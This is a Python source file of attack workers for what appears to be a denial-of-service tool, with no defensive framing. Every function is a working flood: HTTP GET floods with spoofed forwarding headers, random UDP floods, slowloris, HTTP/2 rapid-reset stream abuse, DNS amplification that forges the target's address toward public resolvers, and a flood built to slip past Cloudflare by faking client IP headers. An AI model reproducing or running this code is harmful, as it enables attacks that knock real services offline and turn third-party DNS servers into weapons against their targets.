import socket, time, random, os, ssl
from core.headers import HEADERS_DATA, UAGENTS_DESKTOP

sent = 0
failed = 0

try:
    import h2.connection, h2.config
    H2_AVAILABLE = True
except ImportError:
    H2_AVAILABLE = False

try:
    from scapy.all import IP, UDP, DNS, DNSQR, send
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def http_worker(host, port, lock):
    global sent, failed
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, port))
            ua = random.choice(UAGENTS_DESKTOP)
            packet = f"GET /?{random.randint(1,999999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n"
            packet += HEADERS_DATA
            packet += f"X-Forwarded-For: {random_ip()}\r\n\r\n"
            s.send(packet.encode())
            with lock: sent += 1
            s.close()
        except:
            with lock: failed += 1
            try: s.close()
            except: pass

def udp_worker(host, port, lock):
    global sent, failed
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            s.sendto(os.urandom(random.randint(64, 1490)), (host, port))
            with lock: sent += 1
        except:
            with lock: failed += 1

def slowloris_worker(host, port, lock):
    global sent, failed
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            s.send(f"GET /?{random.randint(1,999999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UAGENTS_DESKTOP)}\r\nConnection: keep-alive\r\n".encode())
            for _ in range(100):
                try:
                    s.send(f"X-keep: {random.randint(1,999999)}\r\n".encode())
                    time.sleep(random.uniform(0.05, 0.3))
                except: break
            with lock: sent += 100
            s.close()
        except:
            with lock: failed += 1
            try: s.close()
            except: pass

def rapid_reset_worker(host, port, lock):
    if not H2_AVAILABLE: return
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    while True:
        try:
            sock = socket.create_connection((host, port), timeout=3)
            sock = ctx.wrap_socket(sock, server_hostname=host)
            config = h2.config.H2Configuration(client_side=True)
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())
            for stream_id in range(1, 2001, 2):
                conn.send_headers(stream_id, [
                    (':method', 'GET'), (':path', f'/?{random.randint(1,999999)}'),
                    (':authority', host), (':scheme', 'https'),
                    ('user-agent', random.choice(UAGENTS_DESKTOP))
                ], end_stream=False)
                conn.reset_stream(stream_id)
            sock.sendall(conn.data_to_send())
            sock.close()
            with lock: sent += 1000
        except:
            with lock: failed += 1

def dns_amp_worker(host, port, lock):
    if not SCAPY_AVAILABLE: return
    dns_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9', '208.67.222.222']
    while True:
        try:
            srv = random.choice(dns_servers)
            pkt = IP(dst=srv, src=host) / UDP(dport=53, sport=random.randint(1024, 65535)) / DNS(rd=1, qd=DNSQR(qname="example.com"))
            send(pkt, verbose=False)
            with lock: sent += 1
        except: pass

def cf_bypass_worker(host, port, lock):
    global sent, failed
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((host, port))
            packet = f"GET /?{random.randint(1,999999)} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(UAGENTS_DESKTOP)}\r\n"
            packet += HEADERS_DATA
            packet += "Sec-Ch-Ua: \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\", \"Not?A_Brand\";v=\"99\"\r\n"
            packet += "Sec-Ch-Ua-Mobile: ?0\r\n"
            packet += "Sec-Ch-Ua-Platform: \"Windows\"\r\n"
            packet += f"CF-Connecting-IP: {random_ip()}\r\n"
            packet += f"True-Client-IP: {random_ip()}\r\n"
            packet += f"X-Forwarded-For: {random_ip()}\r\n\r\n"
            s.send(packet.encode())
            with lock: sent += 1
            s.close()
        except:
            with lock: failed += 1
            try: s.close()
            except: pass
